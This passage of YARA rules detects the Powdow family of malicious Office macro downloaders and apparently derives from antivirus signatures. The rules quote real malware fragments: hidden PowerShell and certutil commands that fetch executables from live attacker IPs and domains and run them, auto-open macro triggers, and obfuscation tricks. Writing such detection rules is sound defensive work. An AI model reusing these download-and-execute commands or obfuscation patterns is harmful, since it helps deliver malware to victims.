        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ttp://173.232.146.78/505/doc106-700-113007.exe\"\" -OutFile $TempFile; Start-Process $TempFile;" ascii //weight: 1
        $x_1_2 = "powershell -WindowStyle hidden -executionpolicy bypass;" ascii //weight: 1
        $x_1_3 = "oWshShellExec.StdOut.ReadAll" ascii //weight: 1
        $x_1_4 = "Workbook_Open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBX_2147830691_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBX!MTB"
        threat_id = "2147830691"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "shell\"wscript\"&y&\"/a.vbs\",vbnormalfocusendsub" ascii //weight: 1
        $x_1_2 = "b.open\"get\",\"https://dc438.4sync.com/download/od13hru0/done.jpg?dsid=wutvc4u7.7920b21f1" ascii //weight: 1
        $x_1_3 = "auto_open()dimb:setb=createobject(\"microsoft.xmlhttp\")dimc:setc=createobject(\"adodb.stream\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBX_2147830691_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBX!MTB"
        threat_id = "2147830691"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/favvv_crypted.exe\"\"-outfile$tempfile;start-process$tempfile;setmypkkhxwnk=createobject(\"wscript.shell\")setmypkkhxwnkexec=mypkkhxwnk.exec(fnsxmhz)endsu" ascii //weight: 1
        $x_1_2 = "powershell-windowstylehidden-executionpolicybypass;$tempfile=[io.path]::gettempfilename()|rename-item-newname{$_-replace'tmp$','exe'" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBY_2147830693_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBY!MTB"
        threat_id = "2147830693"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "call_shell!_(xxxxxxxxxxlora)endsub" ascii //weight: 1
        $x_1_2 = "xxxxxxxxxxlora_=bubu.bubu.value:::::::::::::::::::::::::::::::::::::::::debug_._print" ascii //weight: 1
        $x_1_3 = "subworkbook_open()::" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBZ_2147830882_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBZ!MTB"
        threat_id = "2147830882"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 73 3a 2f 2f 63 64 6e 2e 64 69 73 63 6f 72 64 61 70 70 2e 63 6f 6d 2f 61 74 74 61 63 68 6d 65 6e 74 73 2f 31 30 31 35 35 35 30 31 34 32 37 33 34 31 35 39 39 35 35 2f 31 30 31 36 32 30 34 30 34 33 36 37 34 32 31 30 33 31 34 2f [0-25] 22 22 20 [0-25] 2e 65 78 65 2e 65 78 65 20 26 26 20 [0-25] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBZ_2147830882_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBZ!MTB"
        threat_id = "2147830882"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "aAB0AHQAcABzADoALwAvAGUAbgBjAHUAcgB0AGEAZABvAHIALgBjAG8AbQAuAGIAcgAvAHcARABJAE4ANgANAAoAJwApADs" ascii //weight: 1
        $x_1_2 = {22 50 22 3a 20 [0-30] 20 3d 20 22 6f 22 3a 20 [0-30] 20 3d 20 22 77 22 3a 20 [0-30] 20 3d 20 22 65 22 3a 20 [0-30] 20 3d 20 22 72 22 3a 20 [0-30] 20 3d 20 22 73 22 3a 20 [0-30] 20 3d 20 22 68 22 3a 20 [0-30] 20 3d 20 22 65 22 3a 20 [0-30] 20 3d 20 22 6c 22 3a 20 [0-30] 20 3d 20 22 6c 22 3a}  //weight: 1, accuracy: Low
        $x_1_3 = "= CreateObject(XAVBbhvKLDu)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDAT_2147830909_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDAT!MTB"
        threat_id = "2147830909"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 31 39 35 2e 31 37 38 2e 31 32 30 2e 32 33 30 2f 64 6f 63 74 6f 72 2f 74 69 6b 74 6f 2e 65 78 65 22 22 20 [0-31] 2e 65 78 65 2e 65 78 65 20 26 26 20 00 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVCA_2147831217_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVCA!MTB"
        threat_id = "2147831217"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {67 65 74 6f 62 6a 65 63 74 28 22 6e 65 77 3a 7b 37 32 63 32 34 64 64 35 2d 64 37 30 61 2d 34 33 38 62 2d 38 61 34 32 2d 39 38 34 32 34 62 38 38 61 66 62 38 7d 22 29 3a 3a 3a 3a 3a 73 65 74 72 3d 5f 2e 5f 5f 65 78 65 63 [0-1] 28 78 78 78 78 78 78 6c 6f 72 61 29 65 6e 64 73 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = "xxxxxxlora=.1.controltiptext+.2.value:::::::::::::::::::::::::debug.print" ascii //weight: 1
        $x_1_3 = "subworkbook_open()::" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVCA_2147831217_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVCA!MTB"
        threat_id = "2147831217"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {52 65 70 6c 61 63 65 28 22 63 6d 64 20 2f 63 20 70 6f 77 5e [0-20] 72 73 5e 68 00 6c 6c 2f 57 20 30 31 20 63 5e 75 5e 72 6c 20 68 74 74 5e 70 73 3a 2f 2f 74 72 61 6e 73 66 00 72 2e 73 68 2f 67 00 74 2f [0-30] 2f [0-10] 2e 00 5e 78 00 20 2d 6f 20 22 20 26 20 [0-32] 20 26 20 22 3b 22 20 26 20 [0-32] 2c 20 22 00 22 2c 20 22 65 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {47 65 74 4f 62 6a 65 63 74 28 22 6e 65 77 22 20 26 20 [0-20] 20 26 20 22 44 35 2d 44 37 30 41 2d 34 33 22 20 26 20 6d 67 6b 73 20 26 20 22 42 2d 38 41 34 32 2d 39 38 34 22 20 26 20 43 4c 6e 67 28 ?? ?? ?? 29 20 26 20 22 34 42 38 22 20 26 20 6d 67 6b 73 20 26 20 22 41 46 42 22 20 26 20 6d 67 6b 73 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVCB_2147831430_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVCB!MTB"
        threat_id = "2147831430"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=createobject(\"wscript.shell\")shell.run\"cmd/c\"&savepath&\">nul2>&1\",0,trueendsub" ascii //weight: 1
        $x_1_2 = "url=\"https://lloydfedder.com/si2or.bat\"'downloadthefile" ascii //weight: 1
        $x_1_3 = "subautoopen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVCB_2147831430_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVCB!MTB"
        threat_id = "2147831430"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {78 78 78 78 78 78 5f 2e 5f 6c 6f 61 64 28 22 68 74 74 70 [0-100] 2e 74 78 74 22 29 78 78 78 78 78 78 5f 2e 5f 74 72 61 6e 73 66 6f 72 6d 6e 6f 64 65 78 78 78 78 78 78 65 6e 64 73 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = "createobject(\"new:{2933bf90-7b36-11d2-b20e-00c04f983e60}\"):::::::::xxxxxx_._async=false::" ascii //weight: 1
        $x_1_3 = "workbook_open()::" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVCC_2147831434_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVCC!MTB"
        threat_id = "2147831434"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "callvba.shell$(xxxxxxa)endsub" ascii //weight: 1
        $x_1_2 = "xxxxxxa=111.111.controltiptext+111.112.tag+111.113.controltiptext:::::::::::::::::::::::::debug.print" ascii //weight: 1
        $x_1_3 = "workbook_open()::" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVCC_2147831434_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVCC!MTB"
        threat_id = "2147831434"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {61 75 74 6f 5f 6f 70 65 6e 28 29 69 6d 61 67 65 6d 73 69 6d 70 6c 65 73 63 64 74 3d 22 68 74 74 70 73 3a 2f 2f 77 77 77 2e 34 73 79 6e 63 2e 63 6f 6d 2f 77 65 62 2f 64 69 72 65 63 74 64 6f 77 6e 6c 6f 61 64 2f ?? ?? ?? ?? ?? ?? ?? ?? 2f ?? ?? ?? ?? ?? ?? ?? ?? 2e ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 22 72 65 6e 61 6e 63 64 74 3d 22 63 3a 5c 75 73 65 72 73 5c 70 75 62 6c 69 63 5c 22 75 72 6c 64 6f 77 6e 6c 6f 61 64 74 6f 66 69 6c 65 30}  //weight: 1, accuracy: Low
        $x_1_2 = "shell(m_s+ingridcdt+m_s1+m_s2+m_s3),0endsub" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVCD_2147831448_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVCD!MTB"
        threat_id = "2147831448"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "createobject(activesheet.pagesetup.centerheader)" ascii //weight: 1
        $x_1_2 = "workbook_activate()foreachcellinrange(\"b2:b2\")cell.value" ascii //weight: 1
        $x_1_3 = "ggg.execmethod_(activesheet.pagesetup.leftheader,f8df00)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVCD_2147831448_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVCD!MTB"
        threat_id = "2147831448"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "createobject(\"wscript.shell\")strcommand=\"powershell.exe-c\"\"explorer'\\\\89.23.98.22\\ln\\';start-sleep-seconds1;stop-process-nameexplorer;\\\\89.23.98.22\\ln\\konstantin.exe" ascii //weight: 1
        $x_1_2 = "document_open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVCE_2147831454_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVCE!MTB"
        threat_id = "2147831454"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "mymacro()dimmyurlasstringmyurl=\"http://www.shieldwise.online/updatecheck.exe\"" ascii //weight: 1
        $x_1_2 = "ostream.closeendifpath=\"updatecheck.exe\"shellpath,vbhideendsub" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVCE_2147831454_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVCE!MTB"
        threat_id = "2147831454"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "//gallagherseals.ml/doc/wenozpxnfq.exe'\"ex=\"media.exe';" ascii //weight: 1
        $x_1_2 = "shellhhhh+(\"\"+ssss+gggg+\";invoke-item$mmmmmm\")endsub" ascii //weight: 1
        $x_1_3 = "replace(hhhh,\"ad\",\"she\")hhhh=replace(hhhh,\".exe\",\"ll\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDOA_2147831455_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDOA!MTB"
        threat_id = "2147831455"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ")thg=\"'http://empirevisioninc.xyz/cal/media.exe'\"ex=\"media.exe';\"gggg=\"((" ascii //weight: 1
        $x_1_2 = ")thg=\"'http://empirevisioninc.xyz/cal/wordpad.exe'\"ex=\"media.exe';\"gggg=\"((" ascii //weight: 1
        $x_1_3 = "hellhhhh+(\"\"+ssss+gggg+\";invoke-item$mmmmmm\")endsub" ascii //weight: 1
        $x_1_4 = "+'\\appdata\\\"+exssss=replace(ssss," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDOB_2147831803_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDOB!MTB"
        threat_id = "2147831803"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=socialwork21.ux+socialwork21.tr+boringday.z+boringday.d+hi.openmarket1245+hi.xxx+hi.konsa+hi.t" ascii //weight: 1
        $x_1_2 = "msgbox\"erroroccured!!!\":_callshell!(moneycalculation)endfunction" ascii //weight: 1
        $x_1_3 = "market1245=textfilepart.mosuf1.tagendfunctionfunctionxxx()" ascii //weight: 1
        $x_1_4 = "functionkonsa()asstringkonsa=textfilepart.stuff.tagendfunctionfunctiont()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVCF_2147831937_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVCF!MTB"
        threat_id = "2147831937"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "msgbox\"error!!!\":_callshell!(brokenshowoff)endsub" ascii //weight: 1
        $x_1_2 = "hi.xxx+showoff.konsa+showoff.t" ascii //weight: 1
        $x_1_3 = "subworkbook_open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVCF_2147831937_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVCF!MTB"
        threat_id = "2147831937"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Replace(\"cmd /c pow^a3iix979rs^ha3iix979ll/W 01 c^u^rl htt^ps://vivia3iix979ndas8.com/bb/abc.a3iix979^xa3iix979 -o \" & q04b & \";\" & q04b, \"a3iix979\", \"e\")" ascii //weight: 1
        $x_1_2 = "GetObject(\"new\" & cm3x7zmnc & \"D5-D70A-438B-8A42-984\" & CLng(1.9) & erxi & \"B88AFB\" & CInt(8.1))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDOD_2147831950_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDOD!MTB"
        threat_id = "2147831950"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=moneycount.ux+moneycount.tr+monstercoming.z+monstercoming.d+hi.openmarket1245+hi.xxx+showoff.konsa+showoff.t" ascii //weight: 1
        $x_1_2 = "msgbox\"officeerror!!!\":_callshell!(brokenshowoff)endsub" ascii //weight: 1
        $x_1_3 = "market1245=textfilepart.mosuf1.tagendfunctionfunctionxxx()asstringxxx" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDOE_2147831966_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDOE!MTB"
        threat_id = "2147831966"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 35 34 2e 32 34 39 2e 32 31 30 2e 34 34 2f 78 69 2f 6c 6f 61 64 65 72 2f 75 70 6c 6f 61 64 73 2f [0-10] 2e 65 78 65 22 22 20 [0-31] 2e 65 78 65 2e 65 78 65 20 26 26 20 01 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVCG_2147832041_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVCG!MTB"
        threat_id = "2147832041"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "exe.3980_vni/moc.makcilctsuj//:ptth" ascii //weight: 1
        $x_1_2 = "doyff.run\"certutil.exe-urlcache-split-f\"+jefraciixazyotp+\"\"+fjwvto" ascii //weight: 1
        $x_1_3 = "auto_open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVCG_2147832041_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVCG!MTB"
        threat_id = "2147832041"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {63 6f 6e 74 65 75 64 6f 5f 65 78 65 63 75 74 65 6c 69 6e 6b 3d 22 2f 2f 77 77 77 2e 34 73 79 6e 63 2e 63 6f 6d 2f 77 65 62 2f 64 69 72 65 63 74 64 6f 77 6e 6c 6f 61 64 2f ?? ?? ?? ?? ?? ?? ?? ?? 2f ?? ?? ?? ?? ?? ?? ?? ?? 2e ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 22 63 6f 6e 74 65 75 64 6f 5f 65 78 65 63 75 74 65 31 30 3d 22 2d 6f 74 65 73 74 22 63 6f 6e 74 65 75 64 6f 5f 65 78 65 63 75 74 65 31 31 3d 22 2e 76 62}  //weight: 1, accuracy: Low
        $x_1_2 = "a.run(jkle),0endsub" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SPKT_2147832064_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SPKT!MTB"
        threat_id = "2147832064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "New-Obj\" + iJrety.odjr + \" \" + iJrety.JHdhr + \"et.We\" + iJrety.kdjr + \"t)" ascii //weight: 1
        $x_1_2 = "h\" + zxsfqwrir.isgejf + \"ghtl\" + zxsfqwrir.bdoirg + \"itendom" ascii //weight: 1
        $x_1_3 = "= \"tart-" ascii //weight: 1
        $x_1_4 = "%TMP%\\allaya.exe');S\" + LDrWKe + \"Pro\" + \"cess '%TMP%\\allaya.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDOF_2147832161_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDOF!MTB"
        threat_id = "2147832161"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "_open()=\"run$32#>~.$,#>llexec*un$\"\"%@\"\"\"\"https://www.bndsafety.xyz/p/7.html\"\"\":::::=vba." ascii //weight: 1
        $x_1_2 = ".replace(,\">\",\"he\"):::::set=getobject(\"new:{72c24dd5-d70a-438b-8a42-98424b88afb8}\"):::::::set=_.__exec#()endsub" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVCH_2147832241_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVCH!MTB"
        threat_id = "2147832241"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "exe.999O_P/642.491.3.291//:ptth" ascii //weight: 1
